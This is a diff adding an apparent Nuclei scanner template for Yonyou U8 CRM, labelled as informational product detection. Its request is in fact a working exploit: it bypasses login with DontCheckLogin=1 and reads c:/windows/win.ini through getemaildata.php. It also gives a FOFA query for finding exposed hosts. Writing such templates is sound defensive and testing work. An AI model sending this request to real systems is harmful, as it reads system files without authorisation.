@@ -1,0 +1,26 @@
+id: CRM
+info:
+  name: 用友U8 crm客户关系管理
+  author: mike
+  severity: info
+  description: 用友U8客户关系管理全面解决方案是基于中国企业最佳营销管理实践，更符合中国企业营销管理特点，客户关系管理的整合营销平台
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: body="用友U8CRM"
+http:
+  - raw:
+      - |
+        GET /ajax/getemaildata.php?DontCheckLogin=1&filePath=c:/windows/win.ini HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+    
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "files"
